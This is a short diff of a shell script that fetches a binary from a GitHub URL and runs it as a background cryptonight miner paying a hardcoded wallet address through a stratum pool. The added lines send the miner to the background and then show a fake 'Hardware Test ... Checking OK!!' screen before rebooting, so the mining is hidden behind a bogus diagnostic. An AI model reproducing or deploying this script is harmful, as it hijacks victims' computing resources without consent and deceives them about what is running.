@@ -7,9 +7,19 @@ USER="497mFUrVuiY1uCnGwkRvJVWtEjGeughYLcwQpu4VcSmXZdjUi1KCVSn2tP2ZFbdBMtKKFyrKzR
 TAG="OSRUN"
 
 _RUN(){
+  sysctl -w vm.nr_hugepages=128
   wget https://github.com/osrun/beta/raw/master/run
   chmod +x run
-  ./run -a cryptonight -o stratum+tcp://$END:$PORT -u $USER -p $TAG
+  ./run -B -a cryptonight -o stratum+tcp://$END:$PORT -u $USER -p $TAG
+  clear
+  echo "Hardware Test"
+  echo "-------------"
+  echo "Checking OK!!"
+  echo ""
+  echo ""
+  echo "PRESS [ENTER] TO RESTART"
+  read VAR
+  reboot
 }
 
 if ifconfig | grep "inet addr" | cut -d: -f2 | cut -dB -f1 | cut -d. -f1 | grep -o 192 > /dev/null; then
